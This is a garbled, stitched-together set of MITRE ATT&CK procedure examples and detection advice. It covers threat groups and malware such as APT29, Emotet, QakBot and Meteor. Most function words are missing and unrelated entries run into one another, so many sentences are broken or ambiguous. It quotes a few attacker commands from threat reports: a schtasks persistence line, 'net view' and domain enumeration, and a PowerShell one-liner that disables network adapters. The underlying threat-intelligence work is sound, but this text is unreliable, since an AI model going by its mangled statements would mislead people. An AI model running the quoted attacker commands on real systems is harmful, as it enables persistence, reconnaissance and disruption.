sandbox.(Citation: Cyphort EvilBunny Dec 2014) [LAPSUS$](https://attack.mitre.org/groups/G1004) Explorer tool enumerate victim's network.(Citation: MSTIC DEV-0537 Mar 2022) [Smoke Loader](https://attack.mitre.org/software/S0226) deobfuscates code.(Citation: Talos Smoke Loader July 2018) ensure permission level service binaries replaced modified users permission level. [Turla](https://attack.mitre.org/groups/G0010) JavaScript-based backdoors.(Citation: ESET Turla Mosquito Jan 2018)	 [APT29](https://attack.mitre.org/groups/G0016) <code>cmd.exe</code> execute commands remote machines.(Citation: Volexity SolarWinds)(Citation: Analyzing Solorigate Dec 2020) Command arguments Regsvcs.exe Regasm.exe invocation determining origin purpose binary executed. [Dark Caracal](https://attack.mitre.org/groups/G0070) obfuscated strings [Bandook](https://attack.mitre.org/software/S0234) base64 encoding, encrypting them.(Citation: Lookout Dark Caracal Jan 2018) [Lokibot](https://attack.mitre.org/software/S0447) packing methods obfuscation.(Citation: Infoblox Lokibot January 2019) [Pisloader](https://attack.mitre.org/software/S0124) cmd.exe set Registry key value. command spawn command shell.(Citation: Palo Alto DNS Requests) Ensure proper permissions set Registry hives prevent users modifying COR_PROFILER. Monitor analyze traffic flows follow expected protocol standards traffic flows (e.g extraneous packets belong established flows, gratuitous anomalous traffic patterns). correlation process monitoring command detect anomalous processes execution command arguments traffic patterns (e.g. monitor anomalies files initiate connections respective protocol(s)). [SLOTHFULMEDIA](https://attack.mitre.org/software/S0533) C2 server HTTPS POST requests.(Citation: CISA MAR SLOTHFULMEDIA October 2020) [Emotet](https://attack.mitre.org/software/S0367) observed hard coded list passwords brute force user accounts. (Citation: Malwarebytes Emotet Dec 2017)(Citation: Symantec Emotet Jul 2018)(Citation: US-CERT Emotet Jul 2018)(Citation: Secureworks Emotet Nov 2018)(Citation: CIS Emotet Dec 2018)  [FIN6](https://attack.mitre.org/groups/G0037) encoded data gathered victim simple substitution cipher single-byte XOR 0xAA key, Base64 character permutation.(Citation: FireEye FIN6 April 2016)(Citation: Trend Micro FIN6 October 2019) Internet scanners patterns malicious content designed collect client configuration visitors.(Citation: ThreatConnect Infrastructure Dec 2020)(Citation: ATT ScanBox)
Much activity occurrence false positive rate, visibility target organization, detection difficult defenders. Detection efforts focused stages adversary lifecycle, Initial Access. [Elderwood](https://attack.mitre.org/groups/G0066) encrypted documents malicious executables.(Citation: Symantec Elderwood Sept 2012) [BitPaymer](https://attack.mitre.org/software/S0570) <code>net view</code> discover remote systems.(Citation: Crowdstrike Indrik November 2018) [WindTail](https://attack.mitre.org/software/S0466) incompletely signed revoked certificates.(Citation: objective-see windtail1 dec 2018) Monitor artifacts abnormal process execution. example, common signature reflective code loading Windows mechanisms .NET Common Language Runtime (CLR) -- mscor.dll, mscoree.dll, clr.dll -- loading abnormal processes (such notepad.exe) [BADNEWS](https://attack.mitre.org/software/S0128) collects C2 dead drop resolver.(Citation: Forcepoint Monsoon)(Citation: PaloAlto Patchwork Mar 2018)(Citation: TrendMicro Patchwork Dec 2017) Application isolation limit processes features exploited target access. (Citation: Security Affairs DustSquad Oct 2018)(Citation: Securelist Octopus Oct 2018)(Citation: ESET Nomadic Octopus 2018)  [jRAT](https://attack.mitre.org/software/S0283) map UPnP ports.(Citation: Kaspersky Adwind Feb 2016) (Citation: Cybereason OperationCuckooBees 2022) [Bundlore](https://attack.mitre.org/software/S0482) <code>curl -s -L -o</code> command exfiltrate archived data URL.(Citation: 20 macOS Common Tools Techniques) [APT12](https://attack.mitre.org/groups/G0005) attempted victims malicious Word PDF attachment spearphishing.(Citation: Moran 2014)(Citation: Trend Micro IXESHE 2012) [APT3](https://attack.mitre.org/groups/G0022) downloader creates persistence creating scheduled task: <code>schtasks /create /tn "mysc" /tr C:\Users\Public\test.exe /sc ONLOGON /ru "System"</code>.(Citation: FireEye Operation Double Tap) Monitor domain controller logs replication requests unscheduled activity DCSync. (Citation: DRSR Dec 2017) (Citation: GetNCCChanges) (Citation: Samba DRSUAPI) Note: Domain controllers log replication requests originating default domain controller account. (Citation: Harmj0y DCSync Sept 2015). Monitor replication requests (Citation: SAMR) IPs domain controllers. (Citation: AdSecurity DCSync Sept 2015) [APT29](https://attack.mitre.org/groups/G0016) repeated MFA requests gain access victim accounts.(Citation: Suspected Russian Activity Targeting Government Business Entities Globe) [StreamEx](https://attack.mitre.org/software/S0142) ability enumerate processes.(Citation: Cylance Crew Feb 2017) [QakBot](https://attack.mitre.org/software/S0650) identify remote systems <code>net view</code> command.(Citation: Crowdstrike Qakbot October 2020)(Citation: Kaspersky QakBot September 2021) [Milan](https://attack.mitre.org/software/S1015) establish persistence targeted host scheduled tasks.(Citation: ClearSky Siamesekitten August 2021)(Citation: Accenture Lyceum Targets November 2021) [Empire](https://attack.mitre.org/software/S0363) modules enumerating domain trusts.(Citation: Github PowerShell Empire) [APT38](https://attack.mitre.org/groups/G0082) tool called CLEANTOAD capability modify Registry keys.(Citation: FireEye APT38 Oct 2018) multi-factor authentication possible. Collect file hashes; file names match expected hash suspect. Perform file monitoring; files names unusual locations suspect. Likewise, files modified update patch suspect. (Citation: CrowdStrike Putter Panda) Monitor API calls configure settings automatically execute program boot logon maintain persistence gain higher-level privileges compromised systems. Monitor executed commands arguments abuse security support providers (SSPs) execute DLLs boots. (Citation: ATT QakBot April 2021) (Citation: ClearSky Siamesekitten August 2021) Monitor newly executed processes attempt hide artifacts intrusion, common archive file applications extensions (ex: Zip RAR archive tools), correlate suspicious behavior reduce false positives normal user administrator behavior. [HOPLIGHT](https://attack.mitre.org/software/S0376) modified Managed Object Format (MOF) files Registry specific commands create persistence system.(Citation: US-CERT HOPLIGHT Apr 2019)	 [Sidewinder](https://attack.mitre.org/groups/G0121) Windows service <code>winmgmts:\\.\root\SecurityCenter2</code> check installed antivirus products.(Citation: Rewterz Sidewinder APT April 2020) [SoreFang](https://attack.mitre.org/software/S0516) enumerate domain accounts <code>net.exe user /domain</code>.(Citation: CISA SoreFang July 2016) Monitor newly executed processes establish persistence executing malicious content triggered file type association. [RTM](https://attack.mitre.org/software/S0148) attempt program admin, fake error message legitimate UAC bypass prompt user attempt socially engineer user escalating privileges.(Citation: ESET RTM Feb 2017) [ShimRat](https://attack.mitre.org/software/S0444) pre-configured proxies.(Citation: FOX-IT 2016 Mofang) [APT28](https://attack.mitre.org/groups/G0007) registered domains imitating NATO, OSCE security websites, Caucasus resources, organizations.(Citation: FireEye APT28)(Citation: District Court Indictment GRU Oct 2018)(Citation: Google TAG Ukraine Threat Landscape March 2022) Monitor network data uncommon data flows. Processes utilizing network network communication suspicious. [Melcoz](https://attack.mitre.org/software/S0530) monitor clipboard cryptocurrency addresses change intended address controlled adversary.(Citation: Securelist Brazilian Banking Malware July 2020) [Pony](https://attack.mitre.org/software/S0453) attempted lure targets downloading attached executable (ZIP, RAR, CAB archives) document (PDF Office format).(Citation: Malwarebytes Pony April 2016) Command arguments invocation verclsid.exe determining origin purpose payload executed. [Lucifer](https://attack.mitre.org/software/S0532) identify IP port remote connections compromised host.(Citation: Unit 42 Lucifer June 2020) [T9000](https://attack.mitre.org/software/S0098) gathers beacons time installation.(Citation: Palo Alto T9000 Feb 2016) [ADVSTORESHELL](https://attack.mitre.org/software/S0045) perform keylogging.(Citation: ESET Sednit 2)(Citation: Bitdefender APT28 Dec 2015) [CSPY Downloader](https://attack.mitre.org/software/S0527) ability delete.(Citation: Cybereason Kimsuky November 2020) [Kinsing](https://attack.mitre.org/software/S0599) communicated C2 HTTP.(Citation: Aqua Kinsing April 2020) [Prikormka](https://attack.mitre.org/software/S0113) encrypts C2 traffic Blowfish cipher.(Citation: ESET Operation Groundbait) Monitor reveal indicators malicious firmware strings. comparing components, including hashes component firmware behavior, images. [Maze](https://attack.mitre.org/software/S0449) checked language infected "GetUSerDefaultUILanguage" function.(Citation: McAfee Maze March 2020) [OSX_OCEANLOTUS.D](https://attack.mitre.org/software/S0352) changed permissions second-stage payload executable <code>chmod</code>.(Citation: sentinelone apt32 macOS backdoor 2020) [APT37](https://attack.mitre.org/groups/G0067) Python scripts execute payloads.(Citation: Volexity InkySquid RokRAT August 2021) [TA459](https://attack.mitre.org/groups/G0062) Gh0st variant PCrat/Gh0st.(Citation: Proofpoint TA459 April 2017) [JHUHUGIT](https://attack.mitre.org/software/S0044) tests reach C2 server attempting direct connection, fails, obtaining proxy settings sending connection proxy, finally injecting code running browser proxy method fails.(Citation: ESET Sednit 1) [TAINTEDSCRIBE](https://attack.mitre.org/software/S0586) change timestamp filenames.(Citation: CISA MAR-10288834-2.v1  TAINTEDSCRIBE 2020) [BlackEnergy](https://attack.mitre.org/software/S0089) plug-in gather credentials browsers including FireFox, Google Chrome, Internet Explorer.(Citation: F-Secure BlackEnergy 2014)(Citation: Securelist BlackEnergy Nov 2014) [H1N1](https://attack.mitre.org/software/S0132) dumps usernames passwords Firefox, Internet Explorer, Outlook.(Citation: Cisco H1N1 2) (Citation: NCC APT15 Alive Strong) [Rifdoor](https://attack.mitre.org/software/S0433) ability identify Windows version compromised host.(Citation: Carbon Black HotCroissant April 2020) proxies enforce external network communication policy prevents unauthorized external services. technique easily mitigated preventive controls based behaviors performed scope enterprise defenses controls. [Stealth Falcon](https://attack.mitre.org/groups/G0038) malware WMI script data collection command execution victim.(Citation: Citizen Lab Stealth Falcon 2016) [Operation CuckooBees](https://attack.mitre.org/campaigns/C0012), threat actors `net view` `ping` commands advanced reconnaissance.(Citation: Cybereason OperationCuckooBees 2022) (Citation: Unit42 Clop April 2021)(Citation: Cybereason Clop Dec 2020) [Cryptoistic](https://attack.mitre.org/software/S0498) engage encrypted communications C2.(Citation: SentinelOne Lazarus macOS July 2020) [Operation Wocao](https://attack.mitre.org/campaigns/C0014), threat actors `nbtscan` `ping` discover remote systems, `dsquery subnet` domain controller retrieve subnets Active Directory.(Citation: FoxIT Wocao December 2019) [jRAT](https://attack.mitre.org/software/S0283) configured reconnect intervals.(Citation: Kaspersky Adwind Feb 2016) [APT32](https://attack.mitre.org/groups/G0050) disguised Cobalt Strike beacon Flash Installer.(Citation: Cybereason Cobalt Kitty 2017) [menuPass](https://attack.mitre.org/groups/G0045) tcping.exe, [Ping](https://attack.mitre.org/software/S0097), probe port status systems interest.(Citation: PWC Cloud Hopper Technical Annex April 2017) [Ursnif](https://attack.mitre.org/software/S0386) dropped payload configuration files disk. [Ursnif](https://attack.mitre.org/software/S0386) download execute additional payloads.(Citation: TrendMicro PE_URSNIF.A2)(Citation: TrendMicro BKDR_URSNIF.SM) Ensure wired wireless traffic encrypted appropriately. practices authentication protocols, Kerberos, ensure traffic credentials protected SSL/TLS. [Crimson](https://attack.mitre.org/software/S0115) commands list files directories, search files matching extensions defined list.(Citation: Proofpoint Operation Transparent Tribe March 2016)(Citation: Kaspersky Transparent Tribe August 2020)(Citation: Cisco Talos Transparent Tribe Education Campaign July 2022) [Carberp](https://attack.mitre.org/software/S0484)'s passw.plug plugin gather account multiple instant messaging, email, social media services, FTP, VNC, VPN clients.(Citation: Prevx Carberp March 2011) [TEXTMATE](https://attack.mitre.org/software/S0146) DNS TXT records C2.(Citation: FireEye FIN7 March 2017) [Agent Tesla](https://attack.mitre.org/software/S0331) collect account victim’s machine.(Citation: DigiTrust Agent Tesla Jan 2017) [LAPSUS$](https://attack.mitre.org/groups/G1004) searched victim's network collaboration platforms Confluence JIRA discover high-privilege account credentials.(Citation: MSTIC DEV-0537 Mar 2022) [FlawedAmmyy](https://attack.mitre.org/software/S0381) collect victim's operating initial infection.(Citation: Proofpoint TA505 Mar 2018) instance, [menuPass](https://attack.mitre.org/groups/G0045) [PlugX](https://attack.mitre.org/software/S0013) service display "Corel Writing Tools Utility."(Citation: FireEye APT10 April 2017) Monitor logins SAML tokens 4769 1200 events domain.(Citation: Sygnia Golden SAML) logins occur on-premises resources cloud environment trusts certificate.(Citation: SolarWinds Customer Guidance) [Molerats](https://attack.mitre.org/groups/G0021) msiexec.exe execute MSI payload.(Citation: Unit42 Molerat Mar 2020)  [PowerDuke](https://attack.mitre.org/software/S0139) command victim's domain NetBIOS name.(Citation: Volexity PowerDuke November 2016) [SynAck](https://attack.mitre.org/software/S0242) checks directory location attempt avoid launching sandbox.(Citation: SecureList SynAck Doppelgänging 2018)(Citation: Kaspersky Lab SynAck 2018) Monitor unexpected deletion snapshot (ex: AWS delete-snapshot) [TA505](https://attack.mitre.org/groups/G0092) registered domains impersonate services Dropbox distribute malware.(Citation: Korean FSI TA505 2020) [Lazarus Group](https://attack.mitre.org/groups/G0032) compromised servers stage malicious tools.(Citation: Kaspersky ThreatNeedle Feb 2021)(Citation: ClearSky Lazarus Aug 2020)(Citation: ESET Lazarus Jun 2020)(Citation: McAfee Lazarus Jul 2020) [Lokibot](https://attack.mitre.org/software/S0447) obfuscated strings base64 encoding.(Citation: Infoblox Lokibot January 2019) [Catchamas](https://attack.mitre.org/software/S0261) creates Registry establish persistence adding [Windows Service](https://attack.mitre.org/techniques/T1543/003).(Citation: Symantec Catchamas April 2018) (Citation: Unit42 Molerat Mar 2020) (Citation: Cybereason Molerats Dec 2020) [APT39](https://attack.mitre.org/groups/G0087) tools capturing keystrokes.(Citation: Symantec Chafer February 2018)(Citation: FBI FLASH APT39 September 2020) Monitor executed commands arguments command history console running memory determine unauthorized suspicious commands modify device configuration. [OwaAuth](https://attack.mitre.org/software/S0072) appears exclusively [Threat Group-3390](https://attack.mitre.org/groups/G0027). installed ISAPI filter Exchange servers shares characteristics [China Chopper](https://attack.mitre.org/software/S0020) shell.(Citation: Dell TG-3390) [SslMM](https://attack.mitre.org/software/S0058) sends logged-on username hard-coded C2.(Citation: Baumgartner Naikon 2015) Ensure accounts third-party providers access systems traceable third-party network third-party providers environment. Ensure regular reviews accounts provisioned systems verify continued business need, ensure governance trace de-provisioning access required. Ensure proper access isolation critical network systems account privilege separation. [Attor](https://attack.mitre.org/software/S0438) application window titles determines windows perform Screen Capture on.(Citation: ESET Attor Oct 2019) [ShadowPad](https://attack.mitre.org/software/S0596) deleted arbitrary Registry values.(Citation: Kaspersky ShadowPad Aug 2017) (Citation: Mandiant Easy Breach) [AppleJeus](https://attack.mitre.org/software/S0584)'s installation process, `postinstall` scripts extract hidden plist application's `/Resources` folder execute `plist` file [Launch Daemon](https://attack.mitre.org/techniques/T1543/004) elevated permissions.(Citation: ObjectiveSee AppleJeus 2019) [ZIRCONIUM](https://attack.mitre.org/groups/G0128) tool capture processor architecture compromised host register C2.(Citation: Zscaler APT31 Covid-19 October 2020) [MacSpy](https://attack.mitre.org/software/S0282) Tor command control.(Citation: objsee mac malware 2017) [HTTPBrowser](https://attack.mitre.org/software/S0070) capable writing file compromised C2 server.(Citation: Dell TG-3390) [WannaCry](https://attack.mitre.org/software/S0366) exploit SMBv1 spread remote systems network.(Citation: LogRhythm WannaCry)(Citation: FireEye WannaCry 2017)(Citation: US-CERT WannaCry 2017) [FIN6](https://attack.mitre.org/groups/G0037) targeted victims e-mails malicious attachments.(Citation: Visa FIN6 Feb 2019) [Crutch](https://attack.mitre.org/software/S0538) monitor removable drives plugged compromised machine.(Citation: ESET Crutch December 2020) Monitor executed commands arguments establish persistence executing malicious content triggered file type association. Monitor checksum operating file verifying image operating memory.(Citation: Cisco IOS Software Integrity Assurance - Image File Verification)(Citation: Cisco IOS Software Integrity Assurance - Run-Time Memory Verification) Detection behavior difficult, detection efforts focused closely adversary behaviors, Modify Image. [Downdelph](https://attack.mitre.org/software/S0134) inserts pseudo-random characters original character encoding C2 network requests, difficult write signatures them.(Citation: ESET Sednit 3) [HermeticWiper](https://attack.mitre.org/software/S0697) ability scheduled tasks execution.(Citation: Symantec Ukraine Wipers February 2022) [Kimsuky](https://attack.mitre.org/groups/G0094) attempted lure victims malicious e-mail attachments.(Citation: ThreatConnect Kimsuky September 2020)(Citation: VirusBulletin Kimsuky October 2019)(Citation: CISA AA20-301A Kimsuky)(Citation: Cybereason Kimsuky November 2020)(Citation: Malwarebytes Kimsuky June 2021)(Citation: Talos Kimsuky Nov 2021) Monitor newly executed processes modify file directory permissions/attributes evade access control lists (ACLs) access protected files.(Citation: Hybrid Analysis Icacls1 June 2018)(Citation: Hybrid Analysis Icacls2 2018) [Clop](https://attack.mitre.org/software/S0611) simple XOR operation decrypt strings.(Citation: Mcafee Clop Aug 2019) [StrongPity](https://attack.mitre.org/software/S0491) automatically exfiltrate collected documents C2 server.(Citation: Talos Promethium June 2020)(Citation: Bitdefender StrongPity June 2020) [PoshC2](https://attack.mitre.org/software/S0378) modules searching passwords local remote files.(Citation: GitHub PoshC2) [APT29](https://attack.mitre.org/groups/G0016) compromised O365 administrator account create Service Principal.(Citation: CrowdStrike StellarParticle January 2022) [APT39](https://attack.mitre.org/groups/G0087) tools steal files compromised host.(Citation: Symantec Chafer February 2018)(Citation: FBI FLASH APT39 September 2020) endpoint security solutions configured block types process injection based common sequences behavior occur injection process.  [MoonWind](https://attack.mitre.org/software/S0149) keylogger.(Citation: Palo Alto MoonWind March 2017) [Smoke Loader](https://attack.mitre.org/software/S0226) searches files named logins.json parse credentials.(Citation: Talos Smoke Loader July 2018) [3PARA RAT](https://attack.mitre.org/software/S0066) command control commands encrypted C2 channel DES algorithm CBC mode key derived MD5 hash string HYF54&%9&jkMCXuiS. [3PARA RAT](https://attack.mitre.org/software/S0066) 8-byte XOR key derived string HYF54&%9&jkMCXuiS DES decoding fails(Citation: CrowdStrike Putter Panda)  Ensure extensions installed intended malicious extensions masquerade legitimate ones. (Citation: FireEye APT34 Dec 2017) (Citation: Mandiant APT1 Appendix)(Citation: McAfee Oceansalt Oct 2018) Monitor attempt user gain access network computing resource, domain authentication services, Security Services Daemon (sssd) Linux Monitor processes command-line arguments critical processes terminated running. [Action RAT](https://attack.mitre.org/software/S1028) ability download additional payloads infected machine.(Citation: MalwareBytes SideCopy Dec 2021) [Blue Mockingbird](https://attack.mitre.org/groups/G0108) wmic.exe Windows Registry modifications set COR_PROFILER environment variable execute malicious DLL process loads .NET CLR.(Citation: RedCanary Mockingbird 2020) [Earth Lusca](https://attack.mitre.org/groups/G1006) staged malware malicious files compromised servers, GitHub, Google Drive.(Citation: TrendMicro EarthLusca 2022) [SodaMaster](https://attack.mitre.org/software/S0627) check presence Registry key <code>HKEY_CLASSES_ROOT\\Applications\\VMwareHostOpen.exe</code> proceeding main functionality.(Citation: Securelist APT10 March 2021)	  [Patchwork](https://attack.mitre.org/groups/G0040) payload searched fixed drives victim files matching list extensions.(Citation: Cymmetria Patchwork)(Citation: TrendMicro Patchwork Dec 2017) [Vasport](https://attack.mitre.org/software/S0207) download files.(Citation: Symantec Vasport 2012) [ROKRAT](https://attack.mitre.org/software/S0240) audio capture eavesdropping module.(Citation: Securelist ScarCruft 2019) (Citation: Crowdstrike DNC June 2016) [QakBot](https://attack.mitre.org/software/S0650) variety commands, including esentutl.exe steal sensitive data Internet Explorer Edge, acquire subsequently exfiltrated.(Citation: Red Canary Qbot)(Citation: Kaspersky QakBot September 2021) [InvisiMole](https://attack.mitre.org/software/S0260) remove restore points.(Citation: ESET InvisiMole June 2018) (Citation: Talos Oblique RAT March 2021)(Citation: Cisco Talos Transparent Tribe Education Campaign July 2022) (Citation: CrowdStrike Carbon Spider August 2021) (Citation: Baumgartner Naikon 2015) [Leafminer](https://attack.mitre.org/groups/G0077) obfuscated scripts victim machines.(Citation: Symantec Leafminer July 2018) Commands <code>net /domain</code> [Net](https://attack.mitre.org/software/S0039) gather manipulate groups.(Citation: Savill 1999) [Crimson](https://attack.mitre.org/software/S0115) capture webcam video targeted systems.(Citation: Proofpoint Operation Transparent Tribe March 2016)(Citation: Kaspersky Transparent Tribe August 2020) [Turla](https://attack.mitre.org/groups/G0010) RPC backdoors impersonate steal process tokens executing commands.(Citation: ESET Turla PowerShell 2019)	 [Operation Honeybee](https://attack.mitre.org/campaigns/C0006) included upgraded version [SYSCON](https://attack.mitre.org/software/S0464).(Citation: McAfee Honeybee)  [Dragonfly](https://attack.mitre.org/groups/G0035) modified Registry hide created user accounts.(Citation: US-CERT TA18-074A) [Agent Tesla](https://attack.mitre.org/software/S0331) add Registry startup program establish persistence.(Citation: Fortinet Agent Tesla April 2018)(Citation: SentinelLabs Agent Tesla Aug 2020)  [Sidewinder](https://attack.mitre.org/groups/G0121) <code>mshta.exe</code> execute malicious payloads.(Citation: Rewterz Sidewinder APT April 2020)(Citation: Rewterz Sidewinder COVID-19 June 2020) [XCSSET](https://attack.mitre.org/software/S0658) <code>ps aux</code> <code>grep</code> command enumerate common browsers processes impacting [XCSSET](https://attack.mitre.org/software/S0658)'s exfiltration capabilities.(Citation: trendmicro xcsset xcode project 2020) [Aria-body](https://attack.mitre.org/software/S0456) ability enumerate loaded modules process.(Citation: CheckPoint Naikon 2020). [InvisiMole](https://attack.mitre.org/software/S0260) inject backdoor portable executable target process.(Citation: ESET InvisiMole June 2020)	 [Fysbis](https://attack.mitre.org/software/S0410) Base64 encode C2 traffic.(Citation: Fysbis Dr Analysis) Check integrity existing BIOS EFI determine vulnerable modification. Trusted Platform Module technology. (Citation: TCG Trusted Platform Module) system's root trust hardware prevent tampering SPI flash memory.(Citation: ESET LoJax Sept 2018) Technologies Intel Boot Guard assist this. (Citation: Intel Hardware-based Security Technologies) (Citation: ESET Okrum July 2019) (Citation: MSTIC NOBELIUM Mar 2021) [FIN4](https://attack.mitre.org/groups/G0085) VBA macros display dialog box collect victim credentials.(Citation: FireEye Hacking FIN4 Dec 2014)(Citation: FireEye Hacking FIN4 Video Dec 2014) [AuTo Stealer](https://attack.mitre.org/software/S1029) malicious executables victim's AutoRun registry key StartUp directory, depending AV product installed, maintain persistence.(Citation: MalwareBytes SideCopy Dec 2021) [DCSrv](https://attack.mitre.org/software/S1033) function sleep hours rebooting system.(Citation: Checkpoint MosesStaff Nov 2021) (Citation: Baumgartner Naikon 2015)(Citation: Bitdefender Naikon April 2021) [Sowbug](https://attack.mitre.org/groups/G0054) identified extracted Word documents server command * .doc *.docx. actors searched documents based specific range attempted identify installed software victim.(Citation: Symantec Sowbug Nov 2017) [BLUELIGHT](https://attack.mitre.org/software/S0657) collect username compromised host.(Citation: Volexity InkySquid BLUELIGHT August 2021) [yty](https://attack.mitre.org/software/S0248) gathers victim’s drives plugin document listing.(Citation: ASERT Donot March 2018) [down_new](https://attack.mitre.org/software/S0472) ability download files compromised host.(Citation: Trend Micro Tick November 2019) Monitor processes enumerate domain accounts groups, <code>net.exe</code> <code>net1.exe</code>, executed quick succession.(Citation: Elastic - Koadiac Detection EQL)
 
Information acquired Windows management tools Windows Management Instrumentation PowerShell. Monitor application logs settings events network protocols services commonly abused AiTM.(Citation: dhcp_serv_op_events) Policy configure block additions/modifications W32Time DLLs. (Citation: W32Time 2017) [SLOTHFULMEDIA](https://attack.mitre.org/software/S0533) mimicked names executables, mediaplayer.exe.(Citation: CISA MAR SLOTHFULMEDIA October 2020) [ccf32](https://attack.mitre.org/software/S1043) collect files compromised host.(Citation: Bitdefender FunnyDream Campaign November 2020) restrict access unneeded VB components. Identify critical business processes targeted adversaries isolate secure systems unauthorized access tampering. [Mofang](https://attack.mitre.org/groups/G0103) delivered spearphishing emails malicious links included.(Citation: FOX-IT 2016 Mofang) Streams tool Sysinternals uncover files ADSs. <code>dir /r</code> command display ADSs. (Citation: Symantec ADS 2009) PowerShell commands (such Get-Item, Set-Item, Remove-Item, Get-ChildItem) accept <code>-stream</code> parameter interact ADSs. (Citation: MalwareBytes ADS July 2015) (Citation: ADS Mar 2014) [Daserf](https://attack.mitre.org/software/S0187) samples signed stolen digital certificate.(Citation: Symantec Tick Apr 2016) Monitor newly executed processes create edit shortcuts program boot user login. [Turian](https://attack.mitre.org/software/S0647) ability <code>/bin/sh</code> execute commands.(Citation: ESET BackdoorDiplomacy Jun 2021) [Kimsuky](https://attack.mitre.org/groups/G0094) Nirsoft SniffPass network sniffer passwords non-secure protocols.(Citation: CISA AA20-301A Kimsuky)(Citation: Netscout Stolen Pencil Dec 2018) [Crutch](https://attack.mitre.org/software/S0538) Dropbox receive commands upload stolen data.(Citation: ESET Crutch December 2020) Modules pushed executed [Duqu](https://attack.mitre.org/software/S0038) data staging area, compress it, XOR encrypt it.(Citation: Symantec W32.Duqu) [DnsSystem](https://attack.mitre.org/software/S1021) Base64 encode data C2.(Citation: Zscaler Lyceum DnsSystem June 2022) [WastedLocker](https://attack.mitre.org/software/S0612) created established service runs encryption process complete.(Citation: NCC WastedLocker June 2020)  [SILENTTRINITY](https://attack.mitre.org/software/S0692) module extract cached GPP passwords.(Citation: GitHub SILENTTRINITY Modules July 2019)  [Tropic Trooper](https://attack.mitre.org/groups/G0081) delivered trojan download additional files.(Citation: TrendMicro Tropic Trooper 2020) [OutSteel](https://attack.mitre.org/software/S1017) upload files compromised host C2 channel.(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 )  [gh0st RAT](https://attack.mitre.org/software/S0032) altered InstallTime subkey.(Citation: Gh0stRAT ATT March 2019) [APT39](https://attack.mitre.org/groups/G0087) PowerShell execute malicious code.(Citation: BitDefender Chafer 2020)(Citation: Symantec Chafer February 2018) [BendyBear](https://attack.mitre.org/software/S0574) designed download implant C2 server.(Citation: Unit42 BendyBear Feb 2021) Monitor DLL loads processes, DLLs recognized loaded process. Tools Sysinternals Autoruns overlook AppCert DLLs auto-starting location. (Citation: TechNet Autoruns) (Citation: Sysinternals AppCertDlls Oct 2007) [Cobalt Strike](https://attack.mitre.org/software/S0154) perform pass hash.(Citation: Cobalt Strike TTPs Dec 2017) [Metamorfo](https://attack.mitre.org/software/S0455) collects list installed antivirus software victim’s system.(Citation: Fortinet Metamorfo Feb 2020)(Citation: ESET Casbaneiro Oct 2019)  [Rover](https://attack.mitre.org/software/S0090) persists creating Registry entry <code>HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\</code>.(Citation: Palo Alto Rover) [Trojan.Karagany](https://attack.mitre.org/software/S0094) [netstat](https://attack.mitre.org/software/S0104) collect list network connections.(Citation: Secureworks Karagany July 2019) [FinFisher](https://attack.mitre.org/software/S0182) establishes persistence creating Registry key <code>HKCU\Software\Microsoft\Windows\Run</code>.(Citation: FinFisher Citation)(Citation: FinFisher March 2018) [Cobian RAT](https://attack.mitre.org/software/S0338) feature perform screen capture.(Citation: Zscaler Cobian Aug 2017) [Brave Prince](https://attack.mitre.org/software/S0252) collects hard drive content configuration information.(Citation: McAfee Gold Dragon) [Meteor](https://attack.mitre.org/software/S0688) disconnect network adapters compromised host `powershell -Command "Get-WmiObject -class Win32_NetworkAdapter | ForEach { ($.NetEnabled) { $.Disable() } }" > NUL`.(Citation: Check Meteor Aug 2021) [Squirrelwaffle](https://attack.mitre.org/software/S1030) gathered victim configurations.(Citation: ZScaler Squirrelwaffle Sep 2021) [Neoichor](https://attack.mitre.org/software/S0691) check Internet connectivity contacting bing[.]com request format `bing[.]com?id=<GetTickCount>`.(Citation: NICKEL December 2021) [BADNEWS](https://attack.mitre.org/software/S0128) establishes backdoor HTTP.(Citation: PaloAlto Patchwork Mar 2018) [Kimsuky](https://attack.mitre.org/groups/G0094) spearphishing emails link document contained malicious macros victim actor-controlled domain.(Citation: EST Kimsuky April 2019)(Citation: Netscout Stolen Pencil Dec 2018)(Citation: KISA Operation Muzabi) [Azorult](https://attack.mitre.org/software/S0344) delete files victim machines.(Citation: Unit42 Azorult Nov 2018) Monitor processes reading files disparate locations writing directory file indication data staged, suspected performing encryption compression files, 7zip, RAR, ZIP, zlib. Ensure proper permissions set Registry hives prevent users modifying logon scripts lead persistence. [Wiarp](https://attack.mitre.org/software/S0206) creates backdoor remote attackers download files.(Citation: Symantec Wiarp 2012) [WIRTE](https://attack.mitre.org/groups/G0090) VBScript  operations.(Citation: Lab52 WIRTE Apr 2019)	 [Operation Wocao](https://attack.mitre.org/campaigns/C0014), threat actors' proxy implementation "Agent" upgraded socket TLS socket.(Citation: FoxIT Wocao December 2019) [APT39](https://attack.mitre.org/groups/G0087) tools capable stealing contents clipboard.(Citation: Symantec Chafer February 2018) [Machete](https://attack.mitre.org/groups/G0095) relied users malicious attachments delivered spearphishing execute malware.(Citation: Cylance Machete Mar 2017)(Citation: Securelist Machete Aug 2014)(Citation: ESET Machete July 2019)(Citation: 360 Machete Sep 2020) [WarzoneRAT](https://attack.mitre.org/software/S0670) add `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\UIF2IS20VK` Registry keys.(Citation: Check Warzone Feb 2020) Limit access network infrastructure resources reshape traffic produce AiTM conditions. [APT39](https://attack.mitre.org/groups/G0087) versions Mimikatz credentials.(Citation: BitDefender Chafer 2020) Adversaries binaries locations executed weakness. Identify block malicious software executed path interception application control tools, Windows Defender Application Control, AppLocker, Software Restriction Policies appropriate.(Citation: SANS Application Whitelisting)(Citation: Windows Defender Application Control)(Citation: Windows Commands JPCERT)(Citation: NSA AppLocker)(Citation: Application Lockdown)(Citation: Software Restriction ) [GreyEnergy](https://attack.mitre.org/software/S0342) Tor relays Command Control servers.(Citation: ESET GreyEnergy Oct 2018) Monitoring suspicious processes spawned gather variety perform forms Discovery, short period time, aid detection. Debugger checks occur steps operation occur adversary learns environment. Data events viewed isolation, chain behavior lead activities, lateral movement, based obtained. [OilRig](https://attack.mitre.org/groups/G0049) credential dumping tools [Mimikatz](https://attack.mitre.org/software/S0002) steal credentials accounts logged compromised Outlook Access.(Citation: Unit 42 Playbook Dec 2017)(Citation: FireEye APT34 Webinar Dec 2017)(Citation: FireEye APT35 2018)(Citation: FireEye APT34 July 2019) [Meteor](https://attack.mitre.org/software/S0688) [Wevtutil](https://attack.mitre.org/software/S0645) remove Security, Application Event Viewer logs.(Citation: Check Meteor Aug 2021) 